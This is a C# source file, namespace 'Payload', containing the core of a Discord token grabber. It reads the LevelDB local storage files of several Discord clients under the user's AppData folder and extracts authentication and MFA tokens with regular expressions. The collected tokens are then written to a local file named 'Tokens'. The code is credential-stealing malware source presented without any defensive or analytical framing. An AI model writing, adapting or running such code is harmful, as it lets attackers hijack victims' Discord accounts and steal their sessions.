using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Text.RegularExpressions;
namespace Payload
{
    public class Load
    {
        internal readonly static DirectoryInfo[] RootFolders =
        {
        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb"),
        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordptb\Local Storage\leveldb"),
        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordcanary\Local Storage\leveldb"),
        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discorddevelopment\Local Storage\leveldb"),
        };

        public static List<string> GetTokens()
        {
            List<string> tokens = new List<string>();


            foreach (DirectoryInfo rootfolder in RootFolders) // Foreach discord 'leveldb' folder:
            {
                if (!rootfolder.Exists) break; // If folder doesn't exist: break
                foreach (FileInfo file in rootfolder.GetFiles("*.ldb")) // Foreach .ldb file in 'leveldb':
                {
                    string content = file.OpenText().ReadToEnd(); // Read file

                    // Match tokens:
                    foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                        tokens.Add(match.Value);

                    foreach (Match match in Regex.Matches(content, @"mfa\.[\w-]{84}"))
                        tokens.Add(match.Value);
                }
            }

            return tokens.Distinct().ToList();
        }
        public static void Init()
        {
            File.WriteAllLines("Tokens", GetTokens());
        }
    }
}
